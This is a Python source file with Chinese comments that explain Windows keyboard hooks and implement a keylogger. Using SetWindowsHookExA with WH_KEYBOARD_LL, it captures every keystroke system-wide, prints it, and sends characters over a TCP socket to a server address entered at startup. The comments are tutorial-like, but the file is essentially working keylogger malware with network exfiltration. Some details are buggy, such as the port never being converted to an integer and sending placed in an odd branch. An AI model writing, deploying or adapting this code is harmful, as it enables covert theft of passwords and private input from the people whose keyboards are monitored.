# coding=utf-8
# python3
# by 此意系

# user32.dll：是Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。
#
# kernel32.dll：控制着系统的内存管理、数据的输入输出操作和中断处理。
# Hook技术：又叫做钩子函数，系统在调用函数之前，钩子程序就先捕获该消息，钩子函数先得到控制权，
# 这时钩子函数既可以加工处理（改变）该函数的执行行为，还可以强制结束消息的传递。

# 官方文档 得知钩子类型
# HHOOK SetWindowsHookExA(
#   int       idHook,
#   HOOKPROC  lpfn,
#   HINSTANCE hmod,
#   DWORD     dwThreadId
# );

# python代码
# def installHookProc(hooked, pointer):
#     hooked = user32.SetWindowsHookExA(
#         13,
#         pointer,
#         kernel32.GetModuleHandleW(),
#         0
#     )

# 第一个参数：
# WH_KEYBOARD_LL的常量值为13代表的意思是监视低级键盘输入事件，我们此处来监听键盘事件。
#
# 第二个参数：
# lpfn代表指向钩子过程的指针，要填入钩子过程（函数），我们可以在此处来添加额外代码达到我们想要达成的目的。
#
# 第三个参数：
# hmod表示为DLL句柄，我们可以使用kernel32中的GetModuleHandleW（）来获取句柄。
#
# 第四个参数：
# dwThreadId我们填入0代表与同一桌面上所有的线程关联。

# 在Windows中需要用WINFUNCTYPE来创建函数，WINFUNCTYPE为Windows下独有的，通过使用使用stdcall调用约定的函数。
# HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))

# 关于回调函数因为我们调用的是WH_KEYBOARD_LL,WH_KEYBOARD_LL会使用LowLevelKeyboardProc回调函数。我们也需要在Python中定义它。
# LRESULT CALLBACK LowLevelKeyboardProc(
#   _In_ int    nCode,
#   _In_ WPARAM wParam,
#   _In_ LPARAM lParam
# );

# 勾取
import sys
from ctypes import *
from ctypes.wintypes import DWORD, MSG

# 传输
import socket

MaxBytes = 1024 * 1024
host = str(input("请输入服务端IP:"))  # 服务端IP
port = input("请输入服务端监听端口:") # port = 2828
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(60)
client.connect((host, port))


def tcp_l(word2):
    client.send(word2.encode())


# client.close()
user32 = CDLL("user32.dll")
kernel32 = CDLL("kernel32.dll")


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ('vkCode', DWORD),
        ('scanCode', DWORD),
        ('flags', DWORD),
        ('time', DWORD),
        ('dwExtraInfo', DWORD)]


def uninstallHookProc(hooked):
    if hooked is None:
        return
    user32.UnhookWindowsHookEx(hooked)
    hooked = None


def hookProc(nCode, wParam, lParam):
    if nCode < 0:
        return user32.CallNextHookEx(hooked, nCode, wParam, lParam)
    else:
        if wParam == 256:
            if 162 == lParam.contents.value:
                print("Ctrl pressed, call Hook uninstall()")
                uninstallHookProc(hooked)
                sys.exit(-1)
            capsLock = user32.GetKeyState(20)

            if lParam.contents.value == 13:
                print("\n")
            elif capsLock:
                print(chr(lParam.contents.value), end="")


        else:
            print(chr(lParam.contents.value + 32), end="")  # 输出勾取到的数据

            tcp_l(chr(lParam.contents.value + 32))  # tcp传输

    return user32.CallNextHookEx(hooked, nCode, wParam, lParam)


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)


def installHookProc(hooked, pointer):
    hooked = user32.SetWindowsHookExA(
        13,
        pointer,
        kernel32.GetModuleHandleW(),
        0
    )
    if not hooked:
        return False
    return True



HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))

pointer = HOOKPROC(hookProc)
hooked = None
if installHookProc(hooked, pointer):
    print("Hook installed")
    try:
        msg = MSG()
        user32.GetMessageA(byref(msg), 0, 0, 0)
    except KeyboardInterrupt as kerror:
        uninstallHookProc(hooked)
        print("Hook uninstall...")
else:
    print("Hook installed error")

